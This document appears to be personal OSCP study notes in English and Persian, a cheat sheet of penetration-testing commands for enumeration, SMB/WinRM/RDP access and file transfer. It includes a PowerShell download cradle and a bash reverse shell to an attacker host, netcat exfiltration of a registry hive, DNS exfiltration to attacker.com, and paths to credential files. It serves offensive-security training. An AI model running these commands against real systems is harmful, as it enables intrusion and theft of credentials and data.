# COMMANDS:
#### Encode:
```bash
echo -n " " | base64
```
#### Dcode:
```bash
echo " " | base64 -d
```

#### Search:

**flag:**
```powershell
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "flag" } | Select-Object -ExpandProperty FullName
```

```cmd
dir C:\ /s /b /a | findstr /i flag
```

```cmd
powershell -c "Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'flag' }"
```
**serach:**
```bash
find . -type f -name "<file-name>"
```

```bash
grep -Ri "<word>" .
```

```bash
wordlists -h
```
#### Zip:
**zip**
```bash
zip -r evilplugin.zip evilplugin
```

#### Unzip:
**gz:**
```bash
sudo gzip -d xxx.gz
```
**zip:**
```bash
unzip file.zip
```
#### SSH
```bash
ssh -i id_rsa -p 2222 user@X.X.X.X
```

```bash
ssh -i dt_key -p xxx xxxx@X.X.X.X
```
ssh-keygen

#### Compile
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
#### xfreeedp
3389/tcp open  ms-wbt-server

```bash
xfreerdp /u:offsec /p:lab /v:192.168.241.194
```

#### NetCat
```bash
nc -q 0 192.168.45.152 4444 < SYSTEM
```
	-w 3     =>   wait 3sec
	-q 0     =>   close after sending
	-e cmd.exe => give shell   to    nc -lnvp port

| command  | mean                        |
| -------- | --------------------------- |
| `< file` | فایل رو می‌خونه (input)     |
| `> file` | داخل فایل می‌نویسه (output) |
#### SSH
```bash
ssh eve@192.168.50.214
```

**PYTHON**
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```
#### github
https://download-folder.github.io/
https://download-directory.github.io/


# WEBSITES:

| name                                  | لینک                                                                                                                                                                                             | کاربرد کوتاه                                                  |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- |
| JSCompress                            | [https://jscompress.com/](https://jscompress.com/)                                                                                                                                               | فشرده‌سازی (minify) کد JavaScript                             |
| FuzzDB – alt-extensions-php           | [https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt) | لیست پسوندهای جایگزین PHP برای تست بایپس آپلود                |
| Powercat                              | [https://github.com/besimorhino/powercat](https://github.com/besimorhino/powercat)                                                                                                               | نسخه PowerShell از Netcat برای reverse/bind shell             |
| Canarytokens                          | [https://canarytokens.com/nest/](https://canarytokens.com/nest/)                                                                                                                                 | ساخت توکن تله برای شناسایی دسترسی غیرمجاز                     |
| IPinfo                                | [https://ipinfo.io/what-is-my-ip](https://ipinfo.io/what-is-my-ip)                                                                                                                               | نمایش IP عمومی و اطلاعات مربوطه                               |
| WhatIsMyBrowser Parser                | [https://explore.whatismybrowser.com/useragents/parse/](https://explore.whatismybrowser.com/useragents/parse/)                                                                                   | تحلیل و تبدیل User-Agent به اطلاعات مرورگر/سیستم              |
| Grabify                               | [https://grabify.link/](https://grabify.link/)                                                                                                                                                   | ساخت لینک ردیابی برای ثبت IP و اطلاعات کاربر                  |
| Pentester.com                         | [https://pentester.com/](https://pentester.com/)                                                                                                                                                 | بررسی امنیت ایمیل و نشت داده‌ها                               |
| Download Cradles (HarmJ0y)            | [https://gist.github.com/HarmJ0y/bb48307ffa663256e239](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)<br>[[Download Cradles]]                                                             | مجموعه Download Cradleهای PowerShell برای اجرای کد از راه دور |
| Hash Identifier                       | [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)                                                                                                       | تشخیص نوع هش (MD5, SHA1, …)                                   |
| PayloadAllThings                      | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md                                                              |                                                               |
| compendium                            | https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/                                                                                                                               |                                                               |
| HackTricks                            | https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html                                                                                                                       |                                                               |
| Reverse Shell Cheat Sheet             | https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet                                                                                                                           |                                                               |
| # capabilities(7) — Linux manual page | https://man7.org/linux/man-pages/man7/capabilities.7.html                                                                                                                                        |                                                               |
| linux binary exploits                 | https://gtfobins.org/                                                                                                                                                                            |                                                               |
| windows binary exploits               | https://lolbas-project.github.io/#                                                                                                                                                               |                                                               |
| CyberChef                             | https://gchq.github.io/CyberChef/                                                                                                                                                                |                                                               |
| PowerUP                               | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1                                                                                                                   |                                                               |
| unix-privesc-check                    | https://pentestmonkey.net/tools/audit/unix-privesc-check                                                                                                                                         |                                                               |
# ADDRESS:
### Wordpress:
/wp-admin
/wp-admin.php
/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php
/var/www/flag.txt

etc/passwd
home/USER/.ssh/id_rsa
C:\Windows\System32\drivers\etc\hosts


# First Enumeration
## nmap
```bash
nmap -p- --min-rate=1000 -sS -Pn 192.168.177.222 -oA full
```
```bash
nmap -p 135,139,445,3389,5985,47001 -sCV 192.168.177.222 -oA service
```

| بخش               | معنی              | چرا مهمه           |
| ----------------- | ----------------- | ------------------ |
| `-p-`             | اسکن همه پورت‌ها  | چیزی از دست ندی    |
| `--min-rate=1000` | سرعت بالا         | سریع‌تر نتیجه      |
| `-sS`             | SYN scan          | stealth            |
| `-Pn`             | ignore ping       | اگر ICMP بسته باشه |
| `-oA full`        | ذخیره خروجی       | بعداً استفاده      |
| `-sC`             | default scripts   | vuln + info        |
| `-sV`             | version detection | سرویس دقیق         |
| `-p 135,...`      | فقط پورت‌های مهم  | deep scan          |

| دیدی چی بازه | سریع باید چی بزنی  |
| ------------ | ------------------ |
| 445          | enum4linux, smbmap |
| 5985         | winrm              |
| 3389         | rdp login          |
| 21           | ftp anonymous      |
| 80           | dirb / gobuster    |
## enum4linux-ng
```bash
enum4linux-ng -A 192.168.177.222
```

## CME & NetExec
```bash
crackmapexec smb 192.168.177.222 -u '' -p ''
```
**credential**
```bash
crackmapexec smb 192.168.177.222 -u alex -p 'password'
```
```bash
crackmapexec winrm 192.168.177.222 -u alex -p 'password'
```

```bash
nxc smb 192.168.177.222
```

| پروتکل       | تست بدون Credential             | تست با Credential              | Enum مفید          | اجرای دستور / Shell    | اگر جواب داد → ابزار شل واقعی         |
| ------------ | ------------------------------- | ------------------------------ | ------------------ | ---------------------- | ------------------------------------- |
| **SMB**      | `nxc smb IP -u '' -p ''`        | `nxc smb IP -u user -p pass`   | `--shares --users` | `-x "whoami"` ⚠️ admin | `psexec.py / wmiexec.py / smbexec.py` |
| **WinRM**    | ❌ (معمولاً نمی‌شه)              | `nxc winrm IP -u user -p pass` | —                  | ❌                      | ⭐ `evil-winrm -i IP -u user -p pass`  |
| **RDP**      | `nxc rdp IP -u guest -p ''`     | `nxc rdp IP -u user -p pass`   | —                  | ❌                      | ⭐ `xfreerdp /v:IP /u:user /p:pass`    |
| **FTP**      | `nxc ftp IP -u anonymous -p ''` | `nxc ftp IP -u user -p pass`   | —                  | ❌                      | `ftp IP`                              |
| **SSH**      | ❌ (rare)                        | `nxc ssh IP -u user -p pass`   | —                  | ✅ shell مستقیم         | `ssh user@IP`                         |
| **MSSQL**    | `nxc mssql IP -u sa -p ''`      | `nxc mssql IP -u user -p pass` | `--dbs`            | `-x "whoami"`          | `impacket-mssqlclient`                |
| **LDAP**     | `nxc ldap IP -u '' -p ''`       | `nxc ldap IP -u user -p pass`  | `--users --groups` | ❌                      | `ldapsearch / bloodhound`             |
| **Kerberos** | `nxc kerberos IP`               | —                              | `--users`          | ❌                      | kerberoasting tools                   |
| **VNC**      | `nxc vnc IP -p ''`              | `nxc vnc IP -p pass`           | —                  | ❌                      | `vncviewer`                           |
| **WMI**      | ❌                               | `nxc wmi IP -u user -p pass`   | —                  | `-x "whoami"` ⚠️ admin | `wmiexec.py`                          |
shell
```bash
-x "powershell -c whoami"
```
reverse shell:
```bash
-x "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"
```
## SMBMap
```bash
smbmap -H 192.168.177.222
```
## rpcclient
```bash
rpcclient -U "" -N 192.168.177.222
```
```bash
enumdomusers
```
## RDP (xfreerdp)
```bash
xfreerdp /v:192.168.177.222 /u:alex /p:PASSWORD
```
```bash
xfreerdp /v:192.168.177.222 /u:guest /p:""
```

# OSCP File Transfer – Full Command Table

## 🌐 Network-Based Methods

|روش|جهت|دستور Attacker|دستور Target|
|---|---|---|---|
|HTTP Server (Python)|Download|`python3 -m http.server 8000`|`wget http://ATTACKER_IP:8000/file`|
|HTTP Server (Python alt)|Download|`python3 -m http.server 8000`|`curl -O http://ATTACKER_IP:8000/file`|
|PHP Server|Download|`php -S 0.0.0.0:8000`|`wget http://ATTACKER_IP:8000/file`|
|FTP Server|Both|`python3 -m pyftpdlib -p 21`|`ftp ATTACKER_IP`|
|TFTP|Download|`atftpd --daemon --port 69 /tmp`|`tftp ATTACKER_IP -c get file`|
|SMB Share (Impacket)|Both|`impacket-smbserver share .`|`copy \\ATTACKER_IP\share\file .`|
|SMB (Linux mount)|Both|`impacket-smbserver share .`|`mount -t cifs //ATTACKER_IP/share /mnt`|
|SCP|Both|—|`scp user@ATTACKER_IP:/path/file .`|
|rsync|Both|—|`rsync user@ATTACKER_IP:/file .`|

---

## ⚡ Netcat / Raw Transfer

|روش|جهت|دستور Attacker|دستور Target|
|---|---|---|---|
|Netcat (Download)|Download|`nc -lvnp 4444 < file`|`nc ATTACKER_IP 4444 > file`|
|Netcat (Upload)|Upload|`nc -lvnp 4444 > file`|`nc ATTACKER_IP 4444 < file`|
|Ncat (SSL)|Both|`ncat -lvnp 4444 --ssl`|`ncat ATTACKER_IP 4444 --ssl < file`|

---

## 🪟 Windows-Specific

|روش|جهت|دستور|
|---|---|---|
|PowerShell WebClient|Download|`powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','file')"`|
|Invoke-WebRequest|Download|`powershell -c "Invoke-WebRequest http://ATTACKER_IP/file -OutFile file"`|
|certutil|Download|`certutil -urlcache -split -f http://ATTACKER_IP/file file`|
|bitsadmin|Download|`bitsadmin /transfer job http://ATTACKER_IP/file file`|
|SMB copy|Both|`copy \\ATTACKER_IP\share\file .`|
|net use (mount SMB)|Both|`net use Z: \\ATTACKER_IP\share`|
|WinRM (evil-winrm)|Both|`upload file` / `download file`|
|RDP Clipboard|Both|copy/paste|

---

## 🐧 Linux-Specific

|روش|جهت|دستور|
|---|---|---|
|wget|Download|`wget http://ATTACKER_IP/file`|
|curl|Download|`curl -O http://ATTACKER_IP/file`|
|scp|Both|`scp file user@ATTACKER_IP:/path/`|
|sftp|Both|`sftp user@ATTACKER_IP`|
|nc|Both|`nc ATTACKER_IP 4444 < file`|
|base64 encode|Upload|`base64 file`|
|base64 decode|Download|`base64 -d file.b64 > file`|

---

## 🔐 Restricted / Bypass Methods

|روش|جهت|دستور|
|---|---|---|
|Base64 transfer|Both|`base64 file > file.b64` → paste → `base64 -d file.b64 > file`|
|Echo rebuild|Upload|`echo "data" >> file`|
|Split file|Both|`split -b 1M file`|
|Reassemble|Both|`cat x* > file`|
|DNS exfil|Upload|`nslookup $(base64 file).attacker.com`|
|ICMP (ping)|Upload|`ping -p DATA ATTACKER_IP`|

---

## 🧠 Special Tricks (خیلی مهم برای OSCP)

|روش|دستور|
|---|---|
|Python upload server|`python3 -m uploadserver`|
|انتقال با /dev/tcp|`cat file > /dev/tcp/ATTACKER_IP/4444`|
|گرفتن فایل با bash|`bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`|
|Copy via clipboard (Linux GUI)|`xclip -selection clipboard < file`|

---

## مهم‌ترین دستورات که باید حفظ باشی

اگر وقت نداری، اینا رو **حفظ کن**:

```bash
# HTTP  
python3 -m http.server 8000  
wget http://IP:8000/file  
  
# Windows  
certutil -urlcache -split -f http://IP/file file  
  
# SMB  
impacket-smbserver share .  
copy \\IP\share\file .  
  
# Netcat  
nc -lvnp 4444 < file  
nc IP 4444 > file  
  
# Base64  
base64 file  
base64 -d file > file
```